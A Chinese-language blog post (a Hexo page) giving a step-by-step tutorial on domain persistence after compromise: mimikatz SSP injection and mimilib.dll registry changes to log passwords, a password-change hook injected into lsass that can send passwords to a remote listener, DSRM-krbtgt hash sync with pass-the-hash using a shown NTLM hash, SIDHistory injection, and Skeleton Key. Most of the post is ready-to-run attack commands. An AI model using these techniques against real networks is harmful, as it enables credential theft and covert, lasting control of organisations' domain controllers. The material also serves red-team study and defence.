@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="F4tty" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      内网权限维持(一)-SSP&amp;HOOK&amp;DSRM&amp;SIDhistory&amp;SkeletonKey 
+      
+      
+      |
+    
+     F4tty
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/img/favicon.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/avatar.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">F4tty</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">内网权限维持(一)-SSP&HOOK&DSRM&SIDhistory&SkeletonKey</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-11-02 00:00:00
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                    <b>#</b> 内网安全
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                    #内网
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="内网权限维持-一-SSP-amp-HOOK-amp-DSRM-amp-SIDhistory-amp-SkeletonKey"><a href="#内网权限维持-一-SSP-amp-HOOK-amp-DSRM-amp-SIDhistory-amp-SkeletonKey" class="headerlink" title="内网权限维持(一)-SSP&amp;HOOK&amp;DSRM&amp;SIDhistory&amp;SkeletonKey"></a>内网权限维持(一)-SSP&amp;HOOK&amp;DSRM&amp;SIDhistory&amp;SkeletonKey</h1><p>参考链接:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcxblogs/p/14216525.html">https://www.cnblogs.com/lcxblogs/p/14216525.html</a></p>
+<h2 id="基于验证DLL加载-SSP"><a href="#基于验证DLL加载-SSP" class="headerlink" title="基于验证DLL加载-SSP"></a>基于验证DLL加载-SSP</h2><p>SSP—Security Support Provider，直译为安全支持提供者，又名 Security Package。简单的理解为 SSP 就是一个 DLL，用来实现身份认证，并且维持系统权限</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>利用mimikatz</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::<span class="variable constant_">debug</span></span><br><span class="line">misc::<span class="variable constant_">memssp</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/b140a792/1667350515943-7c325332-5ff9-4bb5-b6d9-b89cf5dca409.png" alt="image.png"><br>该命令会在<code>C:\Windows\System32\mimilsa.log</code>记录登录的账号密码(只用在用户注销然后登录后才会记录)<br><img src="/posts/b140a792/1667350574050-440abd5d-5570-48fc-9a0b-3a56b0a76782.png" alt="image.png"><br><strong>如果域控制器重启，被注入内存的伪造的SSP将会丢失。</strong></p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>1、把mimkatz中的mimilib.dll传到目标域控的<code>C:\windows\system32\</code>目录下<br><img src="/posts/b140a792/1667351283948-a44c5d36-faba-42dc-a157-2e470f4ffa70.png" alt="image.png"><br>2、修改注册表，重启生效</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看当前注册表中的设置值</span></span><br><span class="line">reg query hklm\system\currentcontrolset\control\lsa\ /v &quot;Security Packages&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改注册表中的值</span></span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; /t REG_MULTI_SZ</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/b140a792/1667351501754-d65dfcc4-f9e2-4755-837e-1fd96aa47e6b.png" alt="image.png"><br>命令执行完成后会在注册添加一个mimilib也就是会调用mimilib.dll，<code>\0</code>是换行<br>重启生效后会在<code>C:\windows\system32\kiwissp.log</code> 记录账号密码文件<br><img src="/posts/b140a792/1667351845538-20b58b9a-a75a-4a76-9e3e-22c736f070f6.png" alt="image.png"><br><strong>使用此方法即使系统重启，也不会影响到持久化的效果，但是使用该方法生效想要先重启一下</strong><br>攻防实战中，靶机很难会重启，攻击者重启的话风险过大<br>因此可以在靶机上把两个方法相互结合起来使用效果比较好，<br>有可能存在文件无法读取的情况，可以尝试利用把生成的日志密码文件共享或者发送到内网被控机器或者临时邮箱。</p>
+<h2 id="基于验证DLL加载-HOOK"><a href="#基于验证DLL加载-HOOK" class="headerlink" title="基于验证DLL加载-HOOK"></a>基于验证DLL加载-HOOK</h2><p>Hook PasswordChangeNotify 的作用是当用户修改密码后在系统中进行同步<br><a target="_blank" rel="noopener" href="https://github.com/clymb3r/Misc-Windows-Hacking">本地版HookPasswordChange</a><br><a target="_blank" rel="noopener" href="https://github.com/wh0Nsq/HookPasswordChange">远程版HookPasswordChange</a><br><a target="_blank" rel="noopener" href="https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1">HookPasswordChangeNotify.ps1</a></p>
+<h3 id="本地版"><a href="#本地版" class="headerlink" title="本地版"></a>本地版</h3><p>这里用的是本地版的HookPasswordChange<br><img src="/posts/b140a792/1667353983435-59412f54-815f-43bc-a0bb-177c8f6417a8.png" alt="image.png"><br>密码保存在红框中的目录<br>编译时记得修改属性<br><img src="/posts/b140a792/1667353774267-40c4b820-66b6-4b2a-9f71-272784bbbf74.png" alt="image.png"><br>生成后和<code>HookPasswordChangeNotify.ps1</code>放在一起<br><img src="/posts/b140a792/1667355270767-d0b763d7-f6e6-4d95-9380-67460dcf1f22.png" alt="image.png"><br>在<code>HookPasswordChangeNotify.ps1</code>最后添加一行代码</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-ReflectivePEInjection</span> <span class="literal">-PEPath</span> HookPasswordChange.dll –procname lsass</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/b140a792/1667356062719-f64dea06-4c78-4b49-a40f-a9d38461311f.png" alt="image.png"><br>该powershell脚本最后会调用刚才生成的dll文件</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\HookPasswordChangeNotify.ps1</span><br></pre></td></tr></table></figure>
+
+<p>当用户修改密码时,新的密码就会记录在<code>C:\Windows\Temp\passwords.txt</code><br><img src="/posts/b140a792/1667356354865-4a02e69c-20de-4d60-a026-10c2a74f9c89.png" alt="image.png"></p>
+<h3 id="远程版"><a href="#远程版" class="headerlink" title="远程版"></a>远程版</h3><p>同样是将密码保存到指定目录<br><img src="/posts/b140a792/1667357762746-acd8059e-567f-4895-a7a2-5b4d961dd1be.png" alt="image.png"><br>但是该代码还可以将数据发送到远程服务器<br><img src="/posts/b140a792/1667358075087-f6fc50d7-4960-43e3-952c-7c721d389f28.png" alt="image.png"><br>调用dll会将密码发送值指定地址端口<br>生成后和<code>HookPasswordChangeNotify.ps1</code>放在一起<br><img src="/posts/b140a792/1667355270767-d0b763d7-f6e6-4d95-9380-67460dcf1f22.png" alt="image.png"><br>在<code>HookPasswordChangeNotify.ps1</code>最后添加一行代码</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-ReflectivePEInjection</span> <span class="literal">-PEPath</span> HookPasswordChange.dll –procname lsass</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/b140a792/1667356062719-f64dea06-4c78-4b49-a40f-a9d38461311f.png" alt="image.png"><br>该powershell脚本最后会调用刚才生成的dll文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\HookPasswordChangeNotify.ps1</span><br></pre></td></tr></table></figure>
+
+<p>同样也是修改密码时触发<br>接受端主机开启nc监听<br><img src="/posts/b140a792/1667358241717-5d6d3281-3a4d-4644-b646-db1621e14283.png" alt="image.png"></p>
+<h2 id="基于机制账号启用-DSRM"><a href="#基于机制账号启用-DSRM" class="headerlink" title="基于机制账号启用-DSRM"></a>基于机制账号启用-DSRM</h2><p>DSRM（Diretcory Service Restore Mode，目录服务恢复模式）是windows域环境中域控制器的安全模式启动选项。域控制器的本地管理员账户也就是DSRM账户，DSRM密码是在DC创建时设置的，一般很少更改。DSRM的用途是：允许管理员在域环境出现故障时还原、修复、重建活动目录数据库。通过在DC上运行ntdsutil 工具可以修改DSRM密码。<br><strong>1.获取dsrm及krbtgt的NTLM hash</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /patch /name:krbtgt</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/b140a792/1667373372785-66ab461c-b711-4e7e-8b65-33ec9c832e99.png" alt="image.png"><br><img src="/posts/b140a792/1667373433051-e8d8d319-8051-4da6-ab42-10f6dc879db3.png" alt="image.png"><br>krbtgt是Kerberos认证中的用户,获得该用户hash我们就可以随时登录<br><strong>2.dsrm&amp;krbtgt&amp;NTLM hash同步</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进入ntdsutil</span></span><br><span class="line">ntdsutil</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改DSRM的密码</span></span><br><span class="line">set DSRM password</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使DSRM的密码和指定域用户的密码同步 eg:<span class="built_in">sync</span> from domain account [域用户名]</span></span><br><span class="line">sync from domain account krbtgt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">退出</span></span><br><span class="line">按两次q即可退出(第1次：退出DSRM密码设置模式;第2次退出ntdsutil)</span><br></pre></td></tr></table></figure>
+
+<p>如果出现以下报错<br><img src="/posts/b140a792/1667374219233-9837657a-bd24-4df5-8b70-9eacacdbd5e7.png" alt="image.png"><br>说明krbtgt用户未启用到域管理修改用户即可<br><img src="/posts/b140a792/1667374276063-7d7f2d89-3800-4d70-979e-70785814423a.png" alt="image.png"><br><img src="/posts/b140a792/1667374398041-6507c920-0fa4-429f-b3fe-11a53d8cf1fb.png" alt="image.png"><br>该操作将dsrm的hash和krbtgt保持同步<br><strong>3.修改dsrm登录方式</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#powershel执行</span></span><br><span class="line"><span class="built_in">New-ItemProperty</span> <span class="string">&quot;hklm:\system\currentcontrolset\control\lsa\&quot;</span> <span class="literal">-name</span> <span class="string">&quot;dsrmadminlogonbehavior&quot;</span> <span class="literal">-value</span> <span class="number">2</span> <span class="literal">-propertyType</span> DWORD</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/b140a792/1667374637838-263a01cb-ff78-4518-ada0-1329d6ad6896.png" alt="image.png"><br>dsrmadminlogonbehavior代表的是DSRM有三种登录方式</p>
+<ul>
+<li>0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号</li>
+<li>1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器</li>
+<li>2：在任何情况下，都可以使用DSRM管理员账号登录域控制器</li>
+</ul>
+<p><strong>4.利用PTH传递攻击</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::<span class="variable constant_">debug</span></span><br><span class="line">sekurlsa::<span class="variable constant_">pth</span> /domain:owa2010cn-god /user:administrator /ntlm:b097d7ed97495408e1537f706c357fc5</span><br><span class="line">dir \\owa2010cn-god\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/b140a792/1667375351218-0c652b73-75c3-45cc-9860-0b6780b4f6dd.png" alt="image.png"><br>使用该方法会弹出一个cmd会话，在实战中不现实，可以利用impacket套件中的工具进行pth攻击(而且mimiaktz的使用也需要高权限)<br>利用系统自带机制模式DSRM，修改DSRM默认登录方式和属性，通过其同步krgtgt进行PTH攻击，实现持续化控制，但适用于系统&#x3D;&gt;windows server2008。每个域控制器都有本地管理员账号和密码（与域管理员账号和密码不同）。DSRM账号可以作为一个域控制器的本地管理员用户，通过网络连接域控制器，进而控制域控制器。</p>
+<h2 id="基于用户属性修改-SID-history"><a href="#基于用户属性修改-SID-history" class="headerlink" title="基于用户属性修改-SID-history"></a>基于用户属性修改-SID-history</h2><p>SID即安全标识符（Security Identifiers），是标识用户、组和计算机帐户的唯一的号码。在第一次创建该帐户时，将给网络上的每一个帐户发布一个唯一的 SID。<br>SIDHistory属性的存在是为了解决用户在迁移到另一个域中的时候权限会改变的问题。例如用户zhangsan在A域中本来是管理员，迁移到B域的时候因为sid的改变有可能会变成普通用户权限，这时候如果给zhangsan用户添加一个值为zhangsan在A域中的SID的SIDHistory值就可以解决这个问题，只有域管有更改SIDHistory的权利。<br><strong>1、获取所有用户的sid值</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/b140a792/1667362625761-fa2f73cb-c13c-489c-8c13-b36806410346.png" alt="image.png"><br>可以发现只有后四位不同而且前几个为三位，这里的sid就代表了权限不同<br><strong>2、获取某用户SID属性</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> ActiveDirectory</span><br><span class="line"><span class="built_in">Get-ADUser</span> webadmin <span class="literal">-Properties</span> sidhistory</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/b140a792/1667363254781-138b97f3-8e87-425a-91a0-92b05418d3c7.png" alt="image.png"><br><strong>3、给予某用户administrator属性</strong><br>利用mimikatz</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::<span class="variable constant_">debug</span></span><br><span class="line">sid::<span class="variable constant_">patch</span></span><br><span class="line">sid::<span class="variable constant_">add</span> /sam:webadmin /<span class="keyword">new</span>:administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/b140a792/1667363371676-cb934d84-dad9-450e-b5f9-b05f10654133.png" alt="image.png"><br><img src="/posts/b140a792/1667363465067-4af7a106-0b73-4a96-899a-debc69f75e2a.png" alt="image.png"><br><strong>4、测评给与前后的DC访问权限：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\<span class="number">192.168</span>.<span class="number">3.21</span>\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/b140a792/1667363567346-48abf6b1-11d6-4dee-815d-e0f6e108e032.png" alt="image.png"><br>该方法是把域控管理员的SID加入到其他某个恶意的域账户的SID History中，然后，这个恶意的（我们自己创建的）域账户就可以以域管理员权限访问域控了，<strong>不修改域账户则一直存在</strong>。</p>
+<h2 id="基于登录进程劫持-Skeleton-Key"><a href="#基于登录进程劫持-Skeleton-Key" class="headerlink" title="基于登录进程劫持-Skeleton-Key"></a>基于登录进程劫持-Skeleton-Key</h2><p><strong>1、测试域内某个用户与DC通讯</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\owa2010cn-god\c$</span><br></pre></td></tr></table></figure>
+
+<p>无法成功<br><strong>2、连接DC后，DC注入lsass进程</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="keyword">use</span> \\192.168.3.21\<span class="title">ipc</span>$ &quot;<span class="title">Admin12345</span>&quot; /<span class="title">user</span>:<span class="title">god</span>\<span class="title">administrator</span></span><br></pre></td></tr></table></figure>
+
+<p>域控利用mimikatz：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::<span class="variable constant_">debug</span></span><br><span class="line">misc::<span class="variable constant_">skeleton</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/b140a792/1667359196390-7b02efa4-6c40-42c9-ba56-fa558ce59bc8.png" alt="image.png"><br><strong>3、重新测试域内某个用户与DC通讯</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net <span class="keyword">use</span> \\<span class="title">owa2010cn</span>-<span class="title">god</span>\<span class="title">ipc</span>$ &quot;<span class="title">mimikatz</span>&quot; /<span class="title">user</span>:<span class="title">god</span>\<span class="title">administrator</span></span><br><span class="line"><span class="title">dir</span> \\<span class="title">owa2010cn</span>-<span class="title">god</span>\<span class="title">c</span>$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/b140a792/1667359246554-20bf3daa-dc4d-4ecb-9edd-af21cd3329aa.png" alt="image.png"><br>原来的密码不受影响也是可以使用的<br><img src="/posts/b140a792/1667359281523-f15d4cac-80b7-49a7-ba6a-40bbb086705a.png" alt="image.png"><br>因为Skeleton Key技术是被注入到lsass.exe进程的，<strong>所以它只存在内存中，如域控重启，万能密码将失效</strong>。</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/1ee33d13/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-11-02 00:00:00
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                        <b>#</b> 内网安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                        #内网
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E4%B8%80-SSP-amp-HOOK-amp-DSRM-amp-SIDhistory-amp-SkeletonKey"><span class="toc-text">内网权限维持(一)-SSP&amp;HOOK&amp;DSRM&amp;SIDhistory&amp;SkeletonKey</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81DLL%E5%8A%A0%E8%BD%BD-SSP"><span class="toc-text">基于验证DLL加载-SSP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81DLL%E5%8A%A0%E8%BD%BD-HOOK"><span class="toc-text">基于验证DLL加载-HOOK</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%89%88"><span class="toc-text">本地版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E7%89%88"><span class="toc-text">远程版</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%88%B6%E8%B4%A6%E5%8F%B7%E5%90%AF%E7%94%A8-DSRM"><span class="toc-text">基于机制账号启用-DSRM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%94%A8%E6%88%B7%E5%B1%9E%E6%80%A7%E4%BF%AE%E6%94%B9-SID-history"><span class="toc-text">基于用户属性修改-SID-history</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%99%BB%E5%BD%95%E8%BF%9B%E7%A8%8B%E5%8A%AB%E6%8C%81-Skeleton-Key"><span class="toc-text">基于登录进程劫持-Skeleton-Key</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
